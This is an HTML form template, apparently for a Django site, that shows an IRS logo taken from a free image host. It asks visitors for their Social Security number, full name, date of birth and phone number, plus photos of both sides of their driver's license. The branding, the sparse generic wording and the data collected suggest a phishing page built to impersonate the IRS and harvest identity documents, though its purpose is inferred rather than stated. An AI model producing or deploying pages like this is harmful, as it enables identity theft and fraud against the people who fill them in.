<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://kit.fontawesome.com/f3b99b4317.js" crossorigin="anonymous"></script>

<body>

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Information Form</title>
    </head>
    <body class="bg-light">
        <style>
    
            .hr-container {
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 20px 0;
            }
    
            .hr-container hr {
                flex-grow: 1;
                border: none;
                height: 1px;
                background-color: #000;
                margin: 0 10px;
            }
            .container-border {
                
                border-radius: 10px;
                padding-bottom: 20px;
                
            }
    
            /* Show border on larger screens, hide on smaller screens */
            @media (max-width: 767.98px) {
                .container-border {
                    border-left: none;
                    border-right: none;
                }
            }
        </style>
          <section class="container-fluid">
            <br>
            <div class="text-center">
                <img src="https://i.ibb.co/JCMY4Vw/irs-removebg.png" alt="" width="280px">
            </div>
        </section>
        <br>
        <section class="" style="background-image: linear-gradient(#F5F5F5, white);">
        <div  class="container container-border">
            <div class="row justify-content-center">
                <div class="col-lg-6 col-md-8 col-sm-10">
            <form  method="post" enctype="multipart/form-data" class="p-5 shadow bg-white  rounded">
                <!-- SSN -->
                
                <div class="text-center">
                  <h4>Fill these forms below</h4>
                <span >Required <span style="color: red;">*</span></span>  
                </div>
                {% csrf_token %}
                <div class="mb-3">
                    <label for="ssn" class="form-label">SSN:<span style="color: red;">*</span></label>
                    <input style="height: 60px; border-color: grey; border-width: 2px; border-style: solid; padding: 10px;" type="text" id="ssn" name="ssn" class="form-control" required>
                </div>
    
                <!-- Full Name -->
                <div class="mb-3">
                    <label for="fullName" class="form-label">Full Name:<span style="color: red;">*</span></label>
                    <input style="height: 60px; border-color: grey; border-width: 2px; border-style: solid; padding: 10px;" type="text" id="fullName" name="fullName" class="form-control" required>
                </div>
    
                <!-- Date of Birth -->
                <div class="mb-3">
                    <label for="dob" class="form-label">Date of Birth:<span style="color: red;">*</span></label>
                    <input style="height: 60px; border-color: grey; border-width: 2px; border-style: solid; padding: 10px;" type="date" id="dob" name="dob" class="form-control" required>
                </div>
    
                <!-- Phone Number -->
                <div class="mb-3">
                    <label for="phoneNumber" class="form-label">Phone Number:<span style="color: red;">*</span></label>
                    <input style="height: 60px; border-color: grey; border-width: 2px; border-style: solid; padding: 10px;" type="tel" id="phoneNumber" name="phoneNumber" class="form-control" required>
                </div>
    
                <!-- Picture of Driver's License Front -->
                <div class="mb-3">
                    <label for="licenseFront" class="form-label">Picture of Driver's License Front:<span style="color: red;">*</span></label>
                    <input style="height: 60px; border-color: grey; border-width: 2px; border-style: solid; padding: 10px;" type="file" id="photo1" name="photo1" class="form-control" accept="image/*" required onchange="previewImage('photo1', 'preview1')">
                    <img id="preview1" src="#" alt="Preview of Photo 1" style="display:none; max-width:100px;">
                </div>
    
                <!-- Picture of Driver's License Back -->
                <div class="mb-3">
                    <label for="licenseBack" class="form-label">Picture of Driver's License Back:<span style="color: red;">*</span></label>
                    <input style="height: 60px; border-color: grey; border-width: 2px; border-style: solid; padding: 10px;" type="file" id="photo2" name="photo2" class="form-control" accept="image/*" required onchange="previewImage('photo2', 'preview2')">
                    <img id="preview2" src="#" alt="Preview of Photo 2" style="display:none; max-width:100px;">
                </div>
    
                <!-- Submit Button -->
                <div class="text-center">
                    <button desktop
                     type="submit" style="display: block; width: 100%; height: 50px; text-align: center; background-color: #007bff; color: #fff; text-decoration: none; line-height: 10px;">
                        Submit
                    </button>

                    
                    
                </div>
            </form>
        </div>
        </div>
        </div>


    </section>
    <script>
        function previewImage(inputId, imgId) {
            var input = document.getElementById(inputId);
            var img = document.getElementById(imgId);

            if (input.files && input.files[0]) {
                var reader = new FileReader();

                reader.onload = function(e) {
                    img.src = e.target.result;
                    img.style.display = 'inline';
                }

                reader.readAsDataURL(input.files[0]);
            } else {
                img.src = '#';
                img.style.display = 'none';
            }
        }
    </script>
    </body>
    </html>
     
</body>
</html>
